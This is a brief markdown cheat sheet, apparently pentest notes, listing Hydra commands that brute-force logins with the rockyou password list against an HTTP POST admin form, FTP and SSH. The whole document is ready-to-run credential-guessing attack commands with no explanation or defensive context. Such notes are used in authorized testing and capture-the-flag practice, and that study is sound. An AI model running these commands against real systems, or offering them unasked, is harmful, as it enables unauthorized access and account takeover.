## Hydra

#### HTTP

```bash
hydra -l username -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/admin/index.php:user=admin&pass=^PASS^:Username or password invalid"
```

#### FTP

```bash
hydra -l username -P /usr/share/wordlists/rockyou.txt ftp://$ip
```

#### SSH

```bash
hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://$ip
```
